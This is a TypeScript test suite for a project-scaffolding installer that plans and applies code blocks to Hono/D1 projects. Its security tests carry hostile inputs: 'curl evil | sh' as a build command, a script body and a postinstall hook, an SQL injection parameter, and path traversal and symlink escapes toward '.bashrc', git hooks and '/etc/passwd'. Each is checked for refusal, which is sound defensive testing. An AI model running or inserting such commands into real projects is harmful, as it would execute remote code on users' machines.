import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { KitError } from "../src/errors.ts";
import { memoryFs } from "../src/fs.ts";
import { base64Encode, sha256Hex, toBytes } from "../src/hash.ts";
import { readLock, serializeLock, LOCK_PATH } from "../src/lock.ts";
import { nodeFs, readBlockDir } from "../src/node.ts";
import { applyPlan, loadPlan, planInstall, readProjectForPlan, savePlan, toContractPlan, type InstallPlan, type PlanInput } from "../src/plan.ts";
import type { ProjectProfile } from "../src/profile.ts";
import * as contract from "../src/contract.ts";
import { cloneBundle, FIXTURE_BLOCK, FIXTURE_ID, loadFixtureBlock, loadProject, NOW, text } from "./helpers.ts";

async function plan(over: Partial<PlanInput> & { tree?: Record<string, string> } = {}) {
  const bundle = over.bundle ?? (await loadFixtureBlock());
  const p = loadProject();
  const tree = { ...p.tree, ...(over.tree ?? {}) };
  const fs = memoryFs({ ...tree });
  const profile = over.profile ?? p.profile;
  const project = await readProjectForPlan(fs, { bundle, profile, blockId: FIXTURE_ID, ...(over.params ? { params: over.params } : {}) });
  const result = await planInstall({ bundle, blockId: FIXTURE_ID, profile, project, now: NOW, ...over });
  return { plan: result, fs, profile, tree };
}

describe("acceptance: plan the fixture against hono-d1-min", () => {
  it("renders binding and export identifiers for conflicts and lock metadata", async () => {
    const bundle = cloneBundle(await loadFixtureBlock());
    bundle.manifest.params.push({ name: "bindingName", type: "string", default: "ROOMS" });
    bundle.manifest.params.push({ name: "className", type: "string", default: "ChatRoom" });
    bundle.manifest.bindings.push({ type: "durable_object", name: "{{kit.bindingName}}" });
    bundle.manifest.exports.push({ symbol: "{{kit.className}}", from: "src/room.ts" });
    bundle.manifest.files.push({ path: "src/room.ts", target: "src/lib/room.ts", type: "registry:lib", role: "service" });
    bundle.files["src/room.ts"] = "export class {{kit.className}} {}\n";
    const configured = await plan({ bundle, params: { bindingName: "THREADS", className: "ThreadRoom" } });
    expect(configured.plan.kit.interface.bindings).toContain("durable_object:THREADS");
    const collision = await plan({ bundle, params: { bindingName: "DB", className: "ThreadRoom" }, tree: { "src/lib/room.ts": "export class ThreadRoom { existing = true; }" } });
    expect(collision.plan.conflicts).toContainEqual(expect.objectContaining({ kind: "binding", name: "DB" }));
    expect(collision.plan.conflicts).toContainEqual(expect.objectContaining({ kind: "export", name: "ThreadRoom" }));
    for (const params of [{ bindingName: "bad-binding" }, { className: "bad.symbol" }]) {
      await expect(plan({ bundle, params })).rejects.toMatchObject({ code: "invalid_params" });
    }
  });

  it("renumbers to 0005_auth.sql, patches wrangler.jsonc in two hunks, appends .dev.vars.example, no conflicts", async () => {
    const { plan: p } = await plan();
    expect(p.conflicts).toEqual([]);
    expect(p.migrations).toEqual({ "0001_auth.sql": "0005_auth.sql" });
    expect(p.writes).toContainEqual(expect.objectContaining({ path: "migrations/0005_auth.sql", action: "create", from: "migrations/0001_auth.sql" }));
    expect(p.writes).toContainEqual(expect.objectContaining({ path: "wrangler.jsonc", action: "patch", merge: "jsonc-deep", hunks: 2 }));
    expect(p.writes).toContainEqual(expect.objectContaining({ path: ".dev.vars.example", action: "append", lines: expect.arrayContaining(["TOKEN_PEPPER=", "MAIL_FROM=login@hono-min.dev"]) }));
    expect(p.inferred).toEqual(["appDomain", "appSlug"]);
    expect(p.params).toMatchObject({ appSlug: "hono-d1-min", appDomain: "hono-min.dev", tokenPrefix: "app_" });
    expect(p.verify.commands).toEqual(["npx vitest run test/auth.test.ts", "npx tsc --noEmit"]);
    expect(p.adapt.map((a) => a.id)).toEqual(["mount-routes", "wire-middleware", "set-secrets", "mail-domain"]);
    // config patches and their diffs come first (DESIGN §5.6)
    expect(p.writes.slice(0, 2).map((w) => w.role)).toEqual(["config-patch", "config-patch"]);
    expect(p.kit.diff.indexOf("--- a/wrangler.jsonc")).toBeLessThan(p.kit.diff.indexOf("+++ b/migrations/0005_auth.sql"));
    // comments in wrangler.jsonc survive the merge
    const wr = p.kit.files.find((f) => f.path === "wrangler.jsonc")!;
    const merged = new TextDecoder().decode(Uint8Array.from(atob(wr.content_b64), (c) => c.charCodeAt(0)));
    expect(merged).toContain("// local placeholder id");
    expect(merged).toContain('"send_email": [');
  });

  it("is deterministic: planning twice gives byte-identical plans (golden snapshot)", async () => {
    const a = await plan();
    const b = await plan();
    expect(JSON.stringify(a.plan)).toBe(JSON.stringify(b.plan));
    await expect(JSON.stringify(toContractPlan(a.plan), null, 2) + "\n").toMatchFileSnapshot("golden/plan-hono-d1-min.json");
    await expect(a.plan.kit.diff).toMatchFileSnapshot("golden/plan-hono-d1-min.diff");
  });

  it("the contract view validates against the Plan schema and carries no file contents", async () => {
    const { plan: p } = await plan();
    const c = toContractPlan(p);
    expect(contract.Plan.safeParse(c).success).toBe(true);
    expect(JSON.stringify(c)).not.toContain("content_b64");
    expect(c.plan_id).toMatch(/^plan_[0-9A-Z]{20}$/);
    expect(c.diff_preview_path).toBe(`.kit/plans/${c.plan_id}.diff`);
  });

  it("a project with a members table reports a table conflict naming tablePrefix; tablePrefix=auth_ resolves it", async () => {
    const tree = { "migrations/0005_members.sql": "CREATE TABLE IF NOT EXISTS members (id TEXT PRIMARY KEY);\n" };
    const { plan: p } = await plan({ tree });
    expect(p.conflicts).toEqual([{ kind: "table", name: "members", detail: "migrations/0005_members.sql already creates members", resolve_with_param: "tablePrefix" }]);
    const { plan: p2 } = await plan({ tree, params: { tablePrefix: "auth_" } });
    expect(p2.conflicts).toEqual([]);
    expect(p2.migrations).toEqual({ "0001_auth.sql": "0006_auth.sql" });
    const mig = p2.kit.files.find((f) => f.path === "migrations/0006_auth.sql")!;
    expect(atob(mig.content_b64)).toContain("CREATE TABLE auth_members");
  });
});

describe("planner rules", () => {
  it("explicit params win over inference; invalid params throw invalid_params", async () => {
    const { plan: p } = await plan({ params: { appSlug: "other", tokenPrefix: "mc_" } });
    expect(p.params.appSlug).toBe("other");
    expect(p.inferred).toEqual(["appDomain"]);
    await expect(plan({ params: { tokenPrefix: "x'; DROP TABLE members; --" } })).rejects.toMatchObject({ code: "invalid_params" });
    await expect(plan({ params: { nope: 1 } })).rejects.toThrow(/unknown param/);
  });

  it("an existing differing file stops the install unless a policy is given (skip / overwrite / rename)", async () => {
    const tree = { "src/lib/auth/crypto.ts": "export const mine = 1;\n" };
    const stop = await plan({ tree });
    expect(stop.plan.conflicts).toContainEqual(expect.objectContaining({ kind: "file", name: "src/lib/auth/crypto.ts" }));
    expect(stop.plan.kit.diff).toContain("# conflict: src/lib/auth/crypto.ts exists");
    const skip = await plan({ tree, onConflict: "skip" });
    expect(skip.plan.conflicts).toEqual([]);
    expect(skip.plan.writes).toContainEqual(expect.objectContaining({ path: "src/lib/auth/crypto.ts", action: "skip" }));
    const over = await plan({ tree, onConflict: "overwrite" });
    expect(over.plan.writes).toContainEqual(expect.objectContaining({ path: "src/lib/auth/crypto.ts", action: "overwrite" }));
    const ren = await plan({ tree, onConflict: "rename" });
    expect(ren.plan.writes).toContainEqual(expect.objectContaining({ path: "src/lib/auth/crypto.email-code-auth-fixture.ts", action: "rename" }));
  });

  it("an existing file that exports the same symbol is an export conflict too", async () => {
    const { plan: p } = await plan({ tree: { "src/lib/auth/middleware.ts": "export const requireBearer = () => {};\n" } });
    expect(p.conflicts.map((c) => c.kind)).toEqual(["file", "export"]);
  });

  it("an identical existing file is skipped but tracked", async () => {
    const first = await plan();
    const crypto = first.plan.kit.files.find((f) => f.path === "src/lib/auth/crypto.ts")!;
    const { plan: p } = await plan({ tree: { "src/lib/auth/crypto.ts": atob(crypto.content_b64) } });
    expect(p.conflicts).toEqual([]);
    expect(p.writes).toContainEqual(expect.objectContaining({ path: "src/lib/auth/crypto.ts", action: "skip", reason: "identical file exists" }));
  });

  it("a text file with template: false is copied byte for byte and still gets a diff (WP-08 regression)", async () => {
    const bundle = cloneBundle(await loadFixtureBlock());
    const keyOf = (path: string) => Object.keys(bundle.files).find((k) => k.endsWith(path));
    const entry = bundle.manifest.files.find((f: { role: string; path: string }) => f.role !== "config-patch" && f.role !== "migration" && text(bundle.files[keyOf(f.path)!])?.includes("{{kit."));
    entry.template = false;
    const { plan: p } = await plan({ bundle });
    const f = p.kit.files.find((x) => x.block_path === entry.path)!;
    expect(f).toBeDefined();
    const key = keyOf(entry.path)!;
    expect(atob(f.content_b64)).toBe(text(bundle.files[key]));
    expect(atob(f.content_b64)).toContain("{{kit.");
    expect(p.kit.diff).toContain(`+++ b/${f.path}`);
  });

  it("a binding with the same name and a different type is a conflict", async () => {
    const p0 = loadProject();
    const wr = (p0.tree["wrangler.jsonc"] as string).replace('"vars": {', '"kv_namespaces": [{ "binding": "EMAIL", "id": "x" }],\n  "vars": {');
    const { plan: p } = await plan({ tree: { "wrangler.jsonc": wr } });
    expect(p.conflicts).toContainEqual(expect.objectContaining({ kind: "binding", name: "EMAIL" }));
  });

  it("already installed → conflict pointing to upgrade; another block's route or table → conflict", async () => {
    const lock = {
      version: 1 as const,
      blocks: {
        [FIXTURE_ID]: { version: "1.2.0", variant: "hono-d1", manifest_sha256: "a".repeat(64), registry_signature: "", installed_at: NOW, params: {}, files: [], adapt: {} },
        "@coop/other-auth": {
          version: "1.0.0", variant: "hono-d1", manifest_sha256: "b".repeat(64), registry_signature: "", installed_at: NOW, params: {}, files: [], adapt: {},
          interface: { tables: ["login_codes"], routes: ["POST /auth/email/start"], bindings: ["kv:DB"] },
        },
      },
    };
    const { plan: p } = await plan({ lock });
    const kinds = p.conflicts.map((c) => `${c.kind}:${c.name}${c.resolve_with_param ? `:${c.resolve_with_param}` : ""}`);
    expect(kinds).toEqual(expect.arrayContaining([`already_installed:${FIXTURE_ID}`, "table:login_codes:tablePrefix", "route:POST /auth/email/start:routePrefix", "binding:DB"]));
  });

  it("timestamp projects get YYYYMMDDHHMMSS names after the highest existing one", async () => {
    const p0 = loadProject();
    const profile: ProjectProfile = { ...p0.profile, migrations: { pattern: "TIMESTAMP_name.sql" } };
    const tree: Record<string, string> = {};
    for (const k of Object.keys(p0.tree)) if (!k.startsWith("migrations/")) tree[k] = p0.tree[k] as string;
    tree["migrations/20261020101112_init.sql"] = "CREATE TABLE meta (k TEXT);\n";
    const fs = memoryFs(tree);
    const bundle = await loadFixtureBlock();
    const project = await readProjectForPlan(fs, { bundle, profile, blockId: FIXTURE_ID });
    const p = await planInstall({ bundle, profile, project, blockId: FIXTURE_ID, now: NOW });
    expect(p.migrations).toEqual({ "0001_auth.sql": "20261020101113_auth.sql" });
    await expect(planInstall({ bundle, profile, project, blockId: FIXTURE_ID })).rejects.toThrow(/now/);
  });

  it("dependencies missing from package.json are added through a package.json patch that touches only dependency sections", async () => {
    const p0 = loadProject();
    const pkg = JSON.parse(p0.tree["package.json"] as string);
    delete pkg.dependencies.hono;
    const { plan: p } = await plan({ tree: { "package.json": JSON.stringify(pkg, null, 2) + "\n" } });
    expect(p.dependencies_to_add).toEqual({ hono: "^4.6" });
    expect(p.writes).toContainEqual(expect.objectContaining({ path: "package.json", action: "patch", role: "dependencies" }));
  });

  it("apply_config=false skips config patches and the package.json patch", async () => {
    const { plan: p } = await plan({ applyConfig: false });
    expect(p.writes.filter((w) => w.role === "config-patch").every((w) => w.action === "skip")).toBe(true);
    expect(p.kit.files.some((f) => f.path === "wrangler.jsonc")).toBe(false);
  });

  it("a wrangler patch may not add a custom build command; a merge patch may not remove keys", async () => {
    const b = cloneBundle(await loadFixtureBlock());
    b.files["variants/hono-d1/config/wrangler.patch.jsonc"] = '{ "build": { "command": "curl evil | sh" }, "vars": { "ENVIRONMENT": null } }';
    const { plan: p } = await plan({ bundle: b });
    const names = p.conflicts.filter((c) => c.kind === "config").map((c) => c.name);
    expect(names).toEqual(expect.arrayContaining(["wrangler.jsonc:build", "wrangler.jsonc:vars.ENVIRONMENT"]));
  });

  it("no matching variant for the project's framework → variant conflict", async () => {
    const p0 = loadProject();
    const profile = { ...p0.profile, stack: { ...p0.profile.stack, framework: "nextjs" } };
    const { plan: p } = await plan({ profile });
    expect(p.conflicts).toContainEqual(expect.objectContaining({ kind: "variant" }));
  });
});

describe("path safety in the planner (nasty cases)", () => {
  const withTarget = async (target: string) => {
    const b = cloneBundle(await loadFixtureBlock());
    b.manifest.files[1].target = target;
    return b;
  };

  it("refuses manifests whose target climbs out (validation) ", async () => {
    await expect(plan({ bundle: await withTarget("../../.bashrc") })).rejects.toMatchObject({ code: "invalid_params" });
  });

  it.each([
    [".git/hooks/pre-commit", /VCS/],
    [".kit/lock.json", /kit state/],
    [".kit/blocks/other-block/SKILL.md", /kit state/],
    ["node_modules/hono/dist/index.js", /node_modules/],
    ["package.json", /package manifest/],
    [".dev.vars", /secret file/],
    [".github/workflows/ci.yml", /CI workflow/],
    [".claude/settings.json", /agent configuration/],
  ])("refuses a write to %s", async (target, why) => {
    const err = await plan({ bundle: await withTarget(target) }).catch((e) => e);
    expect(err).toBeInstanceOf(KitError);
    expect(err.code).toBe("forbidden");
    expect(err.message).toMatch(why);
  });

  it("a path token can't smuggle a traversal through the profile", async () => {
    const p0 = loadProject();
    for (const lib of ["../outside", "src/lib\"; import evil from \"x", "/abs"]) {
      const profile = { ...p0.profile, paths: { ...p0.profile.paths, lib } };
      const err = await plan({ profile }).catch((e) => e);
      expect(err.code, lib).toBe("forbidden");
    }
  });
});

describe("applyPlan", () => {
  it("writes exactly the planned files, preserves comments, writes the lock, and returns AppliedPlan", async () => {
    const { plan: p, fs } = await plan();
    const before = { ...fs.tree };
    const applied = await applyPlan(fs, p, { now: NOW });
    expect(contract.AppliedPlan.safeParse(applied).success).toBe(true);
    const written = Object.keys(fs.tree).filter((k) => fs.tree[k] !== before[k]).sort();
    const planned = [...p.kit.files.filter((f) => !f.skip).map((f) => f.path), LOCK_PATH].sort();
    expect(written).toEqual(planned);
    expect(applied.changed_files.sort()).toEqual(planned);
    expect(text(fs.tree["wrangler.jsonc"])).toContain("// A minimal Hono + D1 Worker");
    const lock = await readLock(fs);
    const e = lock.blocks[FIXTURE_ID]!;
    expect(e.version).toBe("1.3.0");
    expect(e.migrations).toEqual({ "0001_auth.sql": "0005_auth.sql" });
    expect(e.adapt).toEqual({ "mount-routes": "pending", "wire-middleware": "pending", "set-secrets": "pending", "mail-domain": "pending" });
    expect(e.interface?.tables).toEqual(["members", "member_tokens", "login_codes"]);
    expect(e.files.map((f) => f.target)).not.toContain("wrangler.jsonc");
    for (const f of e.files) expect(await sha256Hex(fs.tree[f.target]!)).toBe(f.rendered_sha256);
    expect(serializeLock(lock)).toBe(text(fs.tree[LOCK_PATH]));
  });

  it("refuses a plan with conflicts and writes nothing", async () => {
    const { plan: p, fs } = await plan({ tree: { "migrations/0005_members.sql": "CREATE TABLE members (id TEXT);\n" } });
    const before = JSON.stringify(fs.tree);
    await expect(applyPlan(fs, p)).rejects.toMatchObject({ code: "conflicts" });
    expect(JSON.stringify(fs.tree)).toBe(before);
  });

  it("a stale plan (the project changed after planning) is refused before any write", async () => {
    const { plan: p, fs } = await plan();
    fs.tree["wrangler.jsonc"] = (fs.tree["wrangler.jsonc"] as string) + "\n";
    const before = JSON.stringify(fs.tree);
    await expect(applyPlan(fs, p)).rejects.toMatchObject({ code: "plan_stale" });
    expect(JSON.stringify(fs.tree)).toBe(before);
    const p2 = await plan();
    p2.fs.tree["src/lib/auth/codes.ts"] = "// created meanwhile\n";
    await expect(applyPlan(p2.fs, p2.plan)).rejects.toMatchObject({ code: "plan_stale" });
  });

  it("never trusts the plan file: traversal, forbidden targets, hash mismatch and package.json script injection are refused", async () => {
    const base = (await plan()).plan;
    const mutate = (fn: (p: InstallPlan) => void) => {
      const p = structuredClone(base);
      fn(p);
      return p;
    };
    const evil = "#!/bin/sh\ncurl evil | sh\n";
    const fileFor = async (pathName: string) => ({ path: pathName, action: "create" as const, role: "lib", block_path: "x", before_sha256: null, after_sha256: await sha256Hex(evil), content_b64: base64Encode(toBytes(evil)), tracked: true });
    const cases: [InstallPlan, string][] = [
      [mutate((p) => p.kit.files.push({ path: "../outside.sh", action: "create", role: "lib", block_path: "x", before_sha256: null, after_sha256: "", content_b64: "", tracked: true })), "forbidden"],
      [mutate((p) => p.kit.files.push({ path: "src/./x/../../../etc/x", action: "create", role: "lib", block_path: "x", before_sha256: null, after_sha256: "", content_b64: "", tracked: true })), "forbidden"],
    ];
    const p1 = structuredClone(base);
    p1.kit.files.push(await fileFor(".git/hooks/post-checkout"));
    cases.push([p1, "forbidden"]);
    const p2 = structuredClone(base);
    p2.kit.files[0]!.content_b64 = base64Encode(toBytes(evil));
    cases.push([p2, "plan_stale"]);
    const p3 = structuredClone(base);
    const pkg = text(loadProject().tree["package.json"])!;
    const injected = pkg.replace('"test": "vitest run"', '"test": "vitest run", "postinstall": "curl evil | sh"');
    p3.kit.files.push({ path: "package.json", action: "patch", role: "dependencies", block_path: "package.json", before_sha256: await sha256Hex(pkg), after_sha256: await sha256Hex(injected), content_b64: base64Encode(toBytes(injected)), tracked: false });
    cases.push([p3, "forbidden"]);
    const p4 = structuredClone(base);
    p4.plan_id = "plan_../../x";
    cases.push([p4, "invalid_params"]);
    for (const [p, code] of cases) {
      const { fs } = await plan();
      const before = JSON.stringify(fs.tree);
      await expect(applyPlan(fs, p), code).rejects.toMatchObject({ code });
      expect(JSON.stringify(fs.tree)).toBe(before);
    }
  });

  it("savePlan / loadPlan round-trip; loadPlan refuses traversal in the id", async () => {
    const { plan: p, fs } = await plan();
    const saved = await savePlan(fs, p);
    expect(saved.diff).toBe(p.diff_preview_path);
    expect(JSON.stringify(await loadPlan(fs, p.plan_id))).toBe(JSON.stringify(p));
    await expect(loadPlan(fs, "plan_../../../etc")).rejects.toMatchObject({ code: "invalid_params" });
    await expect(loadPlan(fs, "plan_AAAAAAAA")).rejects.toMatchObject({ code: "not_found" });
  });
});

describe("Node adapter", () => {
  it("installs into a real directory and refuses symlinked escapes", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "kit-core-"));
    const p0 = loadProject();
    for (const [k, v] of Object.entries(p0.tree)) {
      mkdirSync(path.dirname(path.join(dir, k)), { recursive: true });
      writeFileSync(path.join(dir, k), v as string);
    }
    const fs = nodeFs(dir);
    const bundle = await readBlockDir(FIXTURE_BLOCK);
    const project = await readProjectForPlan(fs, { bundle, profile: p0.profile, blockId: FIXTURE_ID });
    const p = await planInstall({ bundle, profile: p0.profile, project, blockId: FIXTURE_ID });
    await applyPlan(fs, p, { now: NOW });
    expect(readFileSync(path.join(dir, "migrations/0005_auth.sql"), "utf8")).toContain("CREATE TABLE members");
    expect(existsSync(path.join(dir, ".kit/lock.json"))).toBe(true);

    // a symlink inside the project pointing outside is never followed, for reads or writes
    const outside = mkdtempSync(path.join(tmpdir(), "kit-outside-"));
    symlinkSync(outside, path.join(dir, "src", "escape"));
    await expect(fs.writeFile("src/escape/pwned.txt", toBytes("x"))).rejects.toMatchObject({ code: "forbidden" });
    await expect(fs.readFile("src/escape/anything")).rejects.toMatchObject({ code: "forbidden" });
    await expect(fs.writeFile("../escape.txt", toBytes("x"))).rejects.toMatchObject({ code: "forbidden" });
    await expect(fs.readFile("/etc/passwd")).rejects.toMatchObject({ code: "forbidden" });
    expect(existsSync(path.join(outside, "pwned.txt"))).toBe(false);
  });

  it("readBlockDir records symlinks and modes, which the scanner then refuses", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "kit-block-"));
    writeFileSync(path.join(dir, "block.json"), "{}");
    writeFileSync(path.join(dir, "run.sh"), "echo hi", { mode: 0o755 });
    symlinkSync("/etc/passwd", path.join(dir, "passwd"));
    const b = await readBlockDir(dir);
    expect(b.symlinks).toEqual(["passwd"]);
    expect(b.modes!["run.sh"]! & 0o111).toBeTruthy();
    expect(b.files.passwd).toBeUndefined();
  });
});
